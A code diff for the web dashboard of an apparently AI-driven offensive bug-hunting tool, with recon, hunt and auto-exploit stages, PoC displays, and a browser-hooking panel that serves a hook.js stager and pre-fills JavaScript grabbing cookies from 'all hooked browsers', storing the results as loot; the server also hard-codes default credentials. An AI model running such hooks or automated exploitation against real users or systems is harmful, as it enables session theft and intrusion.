-        <strong style="color:var(--red)">🍑 BINNED FALSE POSITIVE :: ${esc(f.type)} @ ${esc(f.url)}</strong>
-        <div style="color:#ffb3c1;margin-top:4px">${esc((f.critic_notes||[]).join(' | '))}</div>
-      </div>`)
-  ].join('') || '<p style="color:var(--muted)">Run <b>⚡ 6-Agent Autopilot</b> to populate verified advisories, curl PoCs, and RAZOR brown-eye disproofs.</p>';
-}
-
+/* ---------------- render ---------------- */
 function render() {
+  if (!state) return;
   const st = state.status || {};
   const totals = (state.telemetry && state.telemetry.totals) || {};
-  const ti = document.getElementById('targetInput');
-  if (st.target && ti !== document.activeElement) ti.value = st.target;
+  const stats = (state.agent && state.agent.stats) || {};
 
-  document.getElementById('kHttp').textContent = totals.http_requests || 0;
-  document.getElementById('kBin').textContent = totals.bin_runs || 0;
-  document.getElementById('kWaf').textContent = totals.waf_bypasses || 0;
-  document.getElementById('kBeef').textContent = st.beef_online || 0;
-  document.getElementById('kOob').textContent = st.oob_hits || 0;
-  document.getElementById('kVer').textContent = st.verified_count || 0;
-  document.getElementById('kBinFp').textContent = st.disproved_count || 0;
+  $('kHttp').textContent = totals.http_requests || 0;
+  $('kBin').textContent = totals.bin_runs || 0;
+  $('kWaf').textContent = totals.waf_bypasses || 0;
+  $('kVer').textContent = st.verified_count || 0;
+  $('kDis').textContent = st.disproved_count || 0;
 
-  const activeProcs = ((state.telemetry && state.telemetry.active_processes) || []).length;
-  document.getElementById('navActiveCnt').textContent = activeProcs + ' active';
-  document.getElementById('navBeefCnt').textContent = (st.beef_online || 0) + ' hooked';
-  document.getElementById('navVerCnt').textContent = st.verified_count || 0;
-  document.getElementById('cntV').textContent = st.verified_count || 0;
-  document.getElementById('cntD').textContent = st.disproved_count || 0;
-  document.getElementById('cntC').textContent = st.chains_count || 0;
+  const stateEl = $('agentState');
+  const agentState = stats.state || 'IDLE';
+  stateEl.textContent = st.running_job ? 'working' : agentState.toLowerCase();
+  stateEl.className = 'pill ' + (st.running_job ? 'RUNNING' : agentState);
 
-  const jp = document.getElementById('jobPill');
-  if (st.running_job) {
-    jp.classList.add('live');
-    document.getElementById('jobText').textContent = `${st.running_job.command} (${st.running_job.elapsed_s || 0}s)`;
-    document.getElementById('chatTyping').textContent = `⚡ Crew executing: ${st.running_job.command}...`;
+  $('llmBadge').textContent = (st.llm && (st.llm.display_mode || st.llm.active_provider)) || 'groq';
+
+  if (st.target && $('targetInput') !== document.activeElement) $('targetInput').value = st.target;
+  const hint = $('targetHint');
+  if (st.target) {
+    hint.textContent = st.target + (st.lab_running ? ' · local lab' : '');
+    hint.classList.add('set');
   } else {
-    jp.classList.remove('live');
-    document.getElementById('chatTyping').textContent = '';
+    hint.textContent = 'No target set';
+    hint.classList.remove('set');
   }
 
-  document.getElementById('llmBadge').textContent = st.llm?.display_mode || st.llm?.active_provider || 'groq';
-  const ks = document.getElementById('keyStatus');
-  if (ks && st.llm) ks.textContent = `Active: ${st.llm.active_provider} (${st.llm.active_model}) | Endpoint: ${st.llm.base_url} | Key: ${st.llm.api_key_masked}`;
-
-  renderCrew();
-  renderChat();
-  renderRight();
-  renderOps();
-  renderBeef();
-  renderFindingsView();
+  renderStages();
+  renderKpis();
+  renderThread();
+  renderTyping();
+  if (panel) renderPanel();
 }
 
+function renderStages() {
+  const stages = state.stages || [];
+  const cur = (state.status && state.status.current_stage) || '';
+  const done = stages.filter(s => s.state === 'done').length;
+  $('stageProgress').textContent = `${done}/${stages.length || 6}`;
+  $('stageList').innerHTML = stages.map(s => `
+    <button class="stage-row ${esc(s.state)} ${s.key === cur ? 'running' : ''}" onclick="run('/${esc(s.key)}')" title="${esc(s.task)}">
+      <span class="dot">${s.state === 'done' ? '✓' : (s.state === 'running' || s.key === cur ? '▸' : s.index)}</span>
+      <span>${esc(s.label)}</span>
+      <small>${esc(s.state)}</small>
+    </button>`).join('');
+}
+
+function renderKpis() {
+  const st = state.status || {};
+  const stats = (state.agent && state.agent.stats) || {};
+  $('miniKpis').innerHTML = `
+    <div>surface<b>${st.surface_urls || 0}</b></div>
+    <div>leads<b>${st.raw_count || 0}</b></div>
+    <div>verified<b>${st.verified_count || 0}</b></div>
+    <div>disproved<b>${st.disproved_count || 0}</b></div>
+    <div>chains<b>${st.chains_count || 0}</b></div>
+    <div>tools<b>${stats.bin_runs || 0}</b></div>`;
+}
+
+function msgRow(m) {
+  const isUser = (m.speaker === 'YOU');
+  const kind = m.kind || 'info';
+  const tag = `<span class="kindtag ${esc(kind)}">${esc(KIND_LABEL[kind] || kind)}</span>`;
+  const stageTag = m.stage_label ? `<span class="kindtag">${esc(m.stage_label)}</span>` : '';
+  const time = new Date((m.ts || 0) * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+  return `
+    <div class="msg-row ${isUser ? 'user' : ''}">
+      <div class="avatar ${isUser ? 'user' : 'agent'}">${isUser ? 'YOU' : 'AI'}</div>
+      <div class="bubble-col">
+        <div class="who">${isUser ? '' : '<strong style="color:' + AGENT_COLOR + '">AGENT</strong>'} ${tag} ${stageTag}
+          <span style="margin-left:${isUser ? '6px' : 'auto'}">${time}</span></div>
+        <div class="bubble ${esc(kind)}">${md(m.text)}</div>
+      </div>
+    </div>`;
+}
+
+function renderThread() {
+  const msgs = state.transcript || [];
+  const sig = msgs.length + ':' + (msgs.length ? (msgs[msgs.length - 1].ts + '|' + msgs[msgs.length - 1].text.length) : '') +
+              ':' + (state.stages || []).map(s => s.state).join('');
+  if (sig === lastThreadSig) return;
+  const stick = nearBottom();
+  lastThreadSig = sig;
+
+  const thread = $('chatThread');
+  if (!msgs.length) {
+    thread.innerHTML = heroHtml();
+    return;
+  }
+
+  thread.innerHTML = msgs.map(m => {
+    if (m.kind === 'stage') {
+      return `<div class="activity"><span class="atag">stage</span><span>${md(m.text)}</span></div>`;
+    }
+    return msgRow(m);
+  }).join('');
+  scrollToBottom(stick || msgs.length <= 4);
+}
+
+function heroHtml() {
+  const st = state.status || {};
+  return `
+    <div class="hero">
+      <h1>What are we hacking today?</h1>
+      <p>Give me a target and I'll do the rest — map its surface, hunt for bugs, chase down the ones I find,
+         and only report what survives deterministic verification.${st.lab_running ? ' The local VulnCorp lab is already running.' : ''}</p>
+      <div class="hero-grid">
+        <button class="hero-card" onclick="$('targetInput').focus()">
+          <b>1. Set the target</b><code>/target site.com</code>
+          <small>Any host or URL you are authorized to test.</small>
+        </button>
+        <button class="hero-card" onclick="run('/recon')">
+          <b>2. Recon</b><code>/recon</code>
+          <small>Subdomains, live hosts, WAF vendor, crawl, hidden params, dirbust, historical URLs.</small>
+        </button>
+        <button class="hero-card" onclick="run('/hunt')">
+          <b>3. Hunt</b><code>/hunt</code>
+          <small>SQLi, XSS, SSRF, CMDi, SSTI, LFI, 403 bypasses and exposure templates.</small>
+        </button>
+        <button class="hero-card" onclick="run('/auto')">
+          <b>4. Let me drive</b><code>/auto</code>
+          <small>Recon → hunt → pursue every lead with heavy tools → verify → chains → report.</small>
+        </button>
+      </div>
+    </div>`;
+}
+
+function renderTyping() {
+  const st = state.status || {};
+  const stats = (state.agent && state.agent.stats) || {};
+  let el = $('typingRow');
+  if (!st.running_job) { if (el) el.remove(); return; }
+  if (!el) {
+    el = document.createElement('div');
+    el.id = 'typingRow';
+    $('chatThread').appendChild(el);
+  }
+  const cur = (state.stages || []).find(s => s.key === st.current_stage);
+  const detail = [cur ? `${cur.index}/${(state.stages || []).length} ${cur.label}` : '',
+                  stats.current_tool ? '`' + stats.current_tool + '`' : '',
+                  stats.current_task || ''].filter(Boolean).join(' · ');
+  el.className = 'typing';
+  el.innerHTML = `<span class="dots"><i></i><i></i><i></i></span>
+    <span><b style="color:var(--fg)">${esc(st.running_job.command)}</b> ${md(detail)}</span>`;
+  scrollToBottom(false);
+}
+
+/* ---------------- panels ---------------- */
+function openPanelRender(name) { return panel === name; }
+
+function panelSignature() {
+  const st = state.status || {};
+  const t = state.telemetry || {};
+  const b = state.beef || {};
+  const o = state.oob || {};
+  return [
+    panel, st.current_stage, st.verified_count, st.disproved_count, st.chains_count,
+    (t.events || []).length, (t.active_processes || []).length, (t.recent_processes || []).length,
+    (b.loot || []).length, (b.command_log || []).length, (b.sessions_list || []).length,
+    (o.hits || []).length, selectedSid, toolsCache.length, JSON.stringify(st.llm || {})
+  ].join('|');
+}
+
+function renderPanel() {
+  const body = $('panelBody');
+  if (!panel) return;
+  const sig = panelSignature();
+  if (sig === lastPanelSig) return;
+  lastPanelSig = sig;
+
+  const typedJs = ($('customJs') && $('customJs').value) || '';
+  const scrollTop = body.scrollTop;
+
+  if (panel === 'ops') body.innerHTML = opsPanel();
+  else if (panel === 'findings') body.innerHTML = findingsPanel();
+  else if (panel === 'beef') body.innerHTML = beefPanel();
+  else if (panel === 'arsenal') body.innerHTML = arsenalPanel();
+  else if (panel === 'keys') body.innerHTML = keysPanel();
+  else if (panel === 'about') body.innerHTML = aboutPanel();
+
+  if (typedJs && $('customJs')) $('customJs').value = typedJs;
+  body.scrollTop = scrollTop;
+}
+
+function opsPanel() {
+  const st = state.status || {};
+  const stats = (state.agent && state.agent.stats) || {};
+  const t = state.telemetry || {};
+  const act = t.active_processes || [];
+  const rec = t.recent_processes || [];
+  const evs = [...(t.events || [])].reverse().slice(0, 90);
+  const wm = state.waf_mutex || {};
+  const cur = (state.stages || []).find(s => s.key === st.current_stage);
+
+  return `
+    <div class="card ok">
+      <div class="row"><strong style="color:${AGENT_COLOR}">AGENT — ${esc((state.agent && state.agent.role) || '')}</strong>
+        <span class="kindtag ${esc(stats.state || 'IDLE')}">${esc(stats.state || 'IDLE')}</span></div>
+      <div style="margin-top:6px;color:#bde0fe">${esc(stats.current_task || 'Standing by')}</div>
+      <div style="margin-top:4px;color:var(--muted);font-size:11px">tool <code>${esc(stats.current_tool || 'none')}</code>
+        ${cur ? ' · stage ' + cur.index + '/' + (state.stages || []).length + ' ' + esc(cur.label) : ''}</div>
+      <div class="row" style="margin-top:8px;color:var(--muted);font-size:11px">
+        <span>HTTP ${stats.http_requests || 0}</span><span>.bin ${stats.bin_runs || 0}</span>
+        <span>WAF ${stats.waf_bypasses || 0}/${stats.waf_blocks || 0}</span><span>verified ${stats.verified_wins || 0}</span>
+      </div>
+    </div>
+    <h4>Running subprocesses (${act.length})</h4>
+    ${act.length ? act.map(p => `<div class="evrow"><span class="cat">live</span><div class="txt"><code>${esc(p.cmd)}</code><small>${Math.round(p.elapsed_ms)} ms</small></div></div>`).join('') : '<div class="empty">Nothing running right now.</div>'}
+    <h4>Recent .bin runs</h4>
+    ${rec.length ? rec.slice(0, 18).map(p => `<div class="evrow"><span class="cat">${esc(p.status)}</span><div class="txt"><code>${esc(p.cmd)}</code><small>${Math.round(p.duration_ms)} ms</small></div></div>`).join('') : '<div class="empty">No tool runs yet.</div>'}
+    <h4>PAYLOAD_MUTEX state</h4>
+    <pre class="code">${esc(JSON.stringify(wm, null, 2))}</pre>
+    <h4>Live event stream</h4>
+    ${evs.length ? evs.map(e => `<div class="evrow"><span class="cat">${esc(e.category)}</span><div class="txt">${esc(e.title)}<small>${esc(e.detail || '')}</small></div></div>`).join('') : '<div class="empty">No events yet.</div>'}`;
+}
+
+function findingsPanel() {
+  const st = state.status || {};
+  const verified = state.verified || [];
+  const disproved = state.disproved || [];
+  const chains = state.chains || [];
+  const pocs = state.pocs || [];
+  const pocById = {};
+  pocs.forEach(p => { pocById[p.finding_id] = p; });
+
+  return `
+    <div class="card"><div class="row"><strong>${st.verified_count || 0} verified</strong>
+      <span style="color:var(--muted)">${st.disproved_count || 0} disproved · ${st.chains_count || 0} chains · ${pocs.length} PoCs</span></div>
+      ${st.report_path ? `<div style="margin-top:6px;color:var(--muted);font-size:11px">report: <code>${esc(st.report_path)}</code></div>` : ''}
+    </div>
+    <h4>Verified bugs</h4>
+    ${verified.length ? verified.map(f => {
+      const poc = pocById[f.id] || {};
+      return `<div class="card ok">
+        <div class="row"><strong style="color:var(--green)">[${esc((f.severity || '').toUpperCase())}] ${esc(f.type)}</strong><span style="color:var(--muted)">CVSS ${esc(f.cvss_score || '')}</span></div>
+        <div style="color:var(--cyan);word-break:break-all;margin-top:4px">${esc(f.url)}</div>
+        <div style="color:var(--muted);font-size:11px;margin-top:3px">param <code>${esc(f.parameter || 'n/a')}</code> · detected by ${esc(f.detected_by || 'n/a')}${(f.escalated_with || []).length ? ' · confirmed with ' + esc((f.escalated_with || []).join(', ')) : ''}</div>
+        <div style="margin-top:5px">${esc(f.evidence || '')}</div>
+        ${poc.curl ? `<pre class="code">${esc(poc.curl)}</pre>` : ''}
+      </div>`;
+    }).join('') : '<div class="empty">No verified bugs yet — run /hunt or /auto.</div>'}
+    <h4>Disproved claims</h4>
+    ${disproved.length ? disproved.map(f => `<div class="card bad">
+        <strong style="color:var(--red)">${esc(f.type)} @ ${esc(f.url)}</strong>
+        <div style="color:#ffb3c1;font-size:11.5px;margin-top:4px">${esc((f.critic_notes || []).join(' | '))}</div>
+      </div>`).join('') : '<div class="empty">No false positives disproved yet.</div>'}
+    <h4>Attack chains</h4>
+    ${chains.length ? chains.map(c => `<div class="card critical">
+        <strong style="color:var(--magenta)">${esc(c.title || c.name)}</strong>
+        <div style="color:var(--yellow);font-size:11px;margin-top:3px">impact: ${esc(c.impact || c.severity || '')}</div>
+        <pre class="code">${esc((c.steps || []).join('\n→ '))}</pre>
+      </div>`).join('') : '<div class="empty">No chains built yet.</div>'}`;
+}
+
+function beefPanel() {
+  const b = state.beef || {};
+  const sessions = b.sessions_list || [];
+  const modules = b.modules || [];
+  const loot = b.loot || [];
+  const log = b.command_log || [];
+  const oob = (state.oob && state.oob.hits) || [];
+  const hook = window.location.href.split('?')[0].split('#')[0].replace(/\/+$/, '') + '/beef/hook.js';
+
+  return `
+    <div class="card">
+      <b>Browser hook stager</b>
+      <pre class="code">${esc(hook)}</pre>
+      <div class="panel-actions" style="margin-top:6px">
+        <button onclick="spawnVictim()">🪝 Hook demo victim</button>
+        <button onclick="navigator.clipboard && navigator.clipboard.writeText('${esc(hook)}')">Copy hook.js</button>
+        <button onclick="mintOob()">📡 Mint + test OOB</button>
+      </div>
+    </div>
+    <h4>Hooked browsers (${sessions.length})</h4>
+    <div class="panel-actions">
+      <button class="${selectedSid === '*' ? 'primary' : ''}" onclick="selectSid('*')">* broadcast</button>
+      ${sessions.map(s => `<button class="${selectedSid === s.sid ? 'primary' : ''}" onclick="selectSid('${esc(s.sid)}')">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</button>`).join('')}
+    </div>
+    <h4>Attack modules</h4>
+    ${modules.length ? modules.map(m => `<button class="btn" style="width:100%;text-align:left;margin-bottom:6px" onclick="beefModule(${JSON.stringify(m.id)}, ${JSON.stringify(m.name)}, ${JSON.stringify(m.js)})">
+        <b>${esc(m.name)}</b> <span class="kindtag">${esc(m.risk)}</span><br><small style="color:var(--muted)">${esc(m.description)}</small>
+      </button>`).join('') : '<div class="empty">No modules loaded.</div>'}
+    <h4>Custom JavaScript</h4>
+    <textarea id="customJs" rows="3">({title: document.title, cookies: document.cookie, ua: navigator.userAgent})</textarea>
+    <button class="btn primary" onclick="runCustomJs()">⚡ Execute on ${selectedSid === '*' ? 'all hooked browsers' : esc(selectedSid)}</button>
+    <h4>Captured loot (${loot.length})</h4>
+    ${loot.length ? loot.slice().reverse().map(l => `<div class="card ok"><div class="row"><strong>${esc(l.kind)} · ${esc(l.sid)}</strong><span style="color:var(--muted)">${new Date((l.ts || 0) * 1000).toLocaleTimeString()}</span></div><pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre></div>`).join('') : '<div class="empty">No loot captured yet.</div>'}
+    <h4>Command results</h4>
+    ${log.length ? log.slice().reverse().map(c => `<div class="card"><div class="row"><strong>${esc(c.label)} → ${esc(c.sid)}</strong><span class="kindtag">${esc(c.status)}</span></div>${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div class="empty">waiting for the browser to poll…</div>'}</div>`).join('') : '<div class="empty">No commands queued.</div>'}
+    <h4>OOB callbacks (${oob.length})</h4>
+    ${oob.length ? oob.slice().reverse().map(h => `<div class="card high"><strong>${esc(h.method || 'HIT')} ${esc(h.path || h.token)}</strong><div style="color:var(--muted);font-size:11px">${esc(h.remote || '')} · ${esc(h.channel || '')}</div></div>`).join('') : '<div class="empty">No callbacks recorded.</div>'}
+    <div class="empty">The victim browser sandbox is docked at the bottom of this panel.</div>`;
+}
+
+function arsenalPanel() {
+  if (!toolsCache.length) return '<div class="empty">Loading arsenal…</div>';
+  const ready = toolsCache.filter(t => t.status === 'READY').length;
+  return `<div class="card"><b>${ready}/${toolsCache.length} tools READY</b></div>` +
+    toolsCache.map(t => `<div class="card"><div class="row"><strong style="color:var(--cyan)">${esc(t.name)}</strong>
+      <span style="color:${t.status === 'READY' ? 'var(--green)' : 'var(--red)'}">${esc(t.source)} :: ${esc(t.status)}</span></div>
+      <div style="color:var(--muted);font-size:10.5px;margin-top:3px">${esc(t.category || '')} ${esc((t.version || '').slice(0, 90))}</div></div>`).join('');
+}
+
+function keysPanel() {
+  const llm = (state.status && state.status.llm) || {};
+  return `
+    <div class="card">Current: provider <code>${esc(llm.active_provider || '')}</code> · model <code>${esc(llm.active_model || '')}</code><br>
+      endpoint <code>${esc(llm.base_url || '')}</code><br>key <code>${esc(llm.api_key_masked || 'none')}</code> · available ${llm.available ? 'yes' : 'no (deterministic mode)'}</div>
+    <h4>Set provider & key</h4>
+    <select id="provSelect">
+      <option value="groq">Groq Cloud — https://api.groq.com/openai/v1</option>
+      <option value="xai">xAI — https://api.x.ai/v1</option>
+      <option value="openai">OpenAI — https://api.openai.com/v1</option>
+      <option value="ollama">Local Ollama — http://localhost:11434</option>
+    </select>
+    <input id="apiKeyInput" type="password" placeholder="Paste API key (gsk_… / xai-… / sk-…)" />
+    <input id="modelInput" placeholder="Optional model override" />
+    <button class="btn primary" onclick="saveKey()">Save & activate</button>
+    <div id="keyStatus" class="empty" style="margin-top:8px"></div>`;
+}
+
+function aboutPanel() {
+  return `
+    <div class="card">
+      <b>Talk to one agent</b>
+      <div style="color:var(--muted);margin-top:6px;line-height:1.6">
+        Everything you type goes to the single <code>AGENT</code>. It decides what to run and narrates what it finds.
+      </div>
+    </div>
+    <h4>Commands</h4>
+    <div class="card"><code>/target site.com</code> — set the target<div class="empty">Any host or URL you are authorized to test.</div></div>
+    <div class="card"><code>/recon</code> — attack-surface mapping<br><small style="color:var(--muted)">subfinder · assetfinder · dnsx · httpx · wafw00f · katana · hakrawler · arjun · ffuf · gobuster · gau · waybackurls · paramspider</small></div>
+    <div class="card"><code>/hunt</code> — find vulnerabilities<br><small style="color:var(--muted)">SQLi · XSS · SSRF · CMDi · SSTI · LFI · 403 bypass · exposure templates</small></div>
+    <div class="card"><code>/auto</code> — recon → hunt → pursue<br><small style="color:var(--muted)">The agent escalates every lead with heavy tools, verifies it deterministically, keeps what is real, builds chains and writes the report.</small></div>
+    <div class="card"><code>/verify</code> <code>/chains</code> <code>/report</code> <code>/status</code></div>
+    <h4>Natural language works too</h4>
+    <div class="card">“map everything on this host”, “go find and exploit bugs”, “what did you verify so far?”</div>`;
+}
+
+/* ---------------- panel actions ---------------- */
+function selectSid(sid) { selectedSid = sid; lastPanelSig = ''; renderPanel(); }
+function spawnVictim() {
+  const frame = $('victimFrame');
+  if (frame) frame.src = 'beef/victim?t=' + Date.now();
+}
+async function beefModule(id, name, js) {
+  await api('api/beef/command', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ sid: selectedSid, module: id, label: name, js })
+  });
+  setTimeout(refreshState, 400);
+  setTimeout(refreshState, 1300);
+}
+async function runCustomJs() {
+  const js = ($('customJs') && $('customJs').value.trim()) || '';
+  if (!js) return;
+  await beefModule('custom_js', 'Custom JS', js);
+}
+async function mintOob() {
+  await api('api/oob/test', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
+  await refreshState();
+}
+async function saveKey() {
+  const provider = $('provSelect').value;
+  const api_key = $('apiKeyInput').value.trim();
+  const model = $('modelInput').value.trim();
+  const out = await api('api/llm', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ provider, api_key, model })
+  });
+  $('apiKeyInput').value = '';
+  const el = $('keyStatus');
+  if (el) el.innerHTML = `Active: <b>${esc(out.llm.active_provider)}</b> (${esc(out.llm.active_model)}) · key ${esc(out.llm.api_key_masked)}`;
+  await refreshState();
+}
+
+/* ---------------- polling ---------------- */
 async function refreshState() {
   if (pollInFlight) return;
   pollInFlight = true;
@@ -785,19 +941,15 @@ async function refreshState() {
     const incoming = await api('api/state?since=' + lastEventSeq);
     if (incoming && incoming.telemetry) {
       const delta = incoming.telemetry.events || [];
-      if (lastEventSeq === 0) {
-        eventsBuffer = delta.slice(-280);
-      } else if (delta.length) {
-        eventsBuffer = eventsBuffer.concat(delta).slice(-280);
-      }
-      if (typeof incoming.telemetry.latest_seq === 'number') {
-        lastEventSeq = incoming.telemetry.latest_seq;
-      }
+      if (lastEventSeq === 0) eventsBuffer = delta.slice(-280);
+      else if (delta.length) eventsBuffer = eventsBuffer.concat(delta).slice(-280);
+      if (typeof incoming.telemetry.latest_seq === 'number') lastEventSeq = incoming.telemetry.latest_seq;
       incoming.telemetry.events = eventsBuffer;
     }
     state = incoming;
     render();
   } catch (e) {
+    /* transient network hiccup — keep polling */
   } finally {
     pollInFlight = false;
   }
@@ -805,63 +957,16 @@ async function refreshState() {
 
 function scheduleNextPoll() {
   clearTimeout(pollTimer);
-  const delay = document.hidden ? 2500 : 750;
-  pollTimer = setTimeout(async () => {
-    await refreshState();
-    scheduleNextPoll();
-  }, delay);
-}
-document.addEventListener('visibilitychange', () => {
-  if (!document.hidden) scheduleNextPoll();
-});
-
-async function sendCmd(message, speaker = '', asyncMode = true) {
-  await api('api/chat', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({message, speaker, async: asyncMode})
-  });
-  await refreshState();
+  const delay = document.hidden ? 2500 : 800;
+  pollTimer = setTimeout(async () => { await refreshState(); scheduleNextPoll(); }, delay);
 }
 
-function toggleKeyBar() {
-  const el = document.getElementById('keyBar');
-  el.style.display = (el.style.display === 'none' ? 'flex' : 'none');
-}
+document.addEventListener('visibilitychange', () => { if (!document.hidden) { scheduleNextPoll(); refreshState(); } });
 
-async function saveLlmKey() {
-  const provider = document.getElementById('provSelect').value;
-  const api_key = document.getElementById('apiKeyInput').value.trim();
-  const model = document.getElementById('modelInput').value.trim();
-  await api('api/llm', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({provider, api_key, model})
-  });
-  document.getElementById('apiKeyInput').value = '';
-  await refreshState();
-}
-
-async function setTarget() {
-  const v = document.getElementById('targetInput').value.trim();
-  if (v) await sendCmd('/target ' + v, '', false);
-}
-
-async function onSubmitChat(ev) {
-  ev.preventDefault();
-  const inp = document.getElementById('chatInput');
-  const speaker = document.getElementById('speakerSelect').value;
-  const msg = inp.value.trim();
-  if (!msg) return;
-  inp.value = '';
-  await sendCmd(msg, speaker, true);
-}
-
-api('api/tools').then(d => { toolsCache = d.tools || []; if (state) renderFindingsView(); }).catch(() => {});
+api('api/tools').then(d => { toolsCache = d.tools || []; }).catch(() => {});
 refreshState().then(() => {
-  if (state && (!state.transcript || !state.transcript.length)) {
-    sendCmd('Oi crew! Sound off with station status in #basement-ops!', '', true);
-  }
+  autoGrow();
+  $('chatInput').focus();
   scheduleNextPoll();
 });
 </script>
@@ -923,7 +1028,7 @@ def start_warroom_server(
     auth_pass: str | None = None,
     require_auth: bool = True,
 ):
-    CFG["crew_banter"] = True
+    CFG["agent_streaming"] = True
     ui_user = auth_user if auth_user is not None else os.environ.get("BUGHUNTER_UI_USER", "admin")
     ui_pass = auth_pass if auth_pass is not None else os.environ.get("BUGHUNTER_UI_PASS", "bugsBounty")
 
@@ -1093,6 +1198,11 @@ def start_warroom_server(
                 self._json(200, out)
                 return
 
+            if path == "/api/reset":
+                keep_target = bool(body.get("keep_target", True))
+                self._json(200, {"ok": True, "status": session.reset(keep_target=keep_target)})
+                return
+
             if path == "/api/beef/command":
                 sid = (body.get("sid") or "*").strip()
                 js_code = (body.get("js") or "").strip()
@@ -1123,10 +1233,9 @@ def start_warroom_server(
                     persist=True,
                 )
                 st_llm = get_llm().status_summary()
-                CREW_BUS.say(
-                    "GHOST",
-                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`!",
-                    kind="cheer",
+                AGENT_BUS.say(
+                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`.",
+                    kind="info",
                 )
                 self._json(200, {"ok": True, "info": info, "llm": st_llm})
                 return
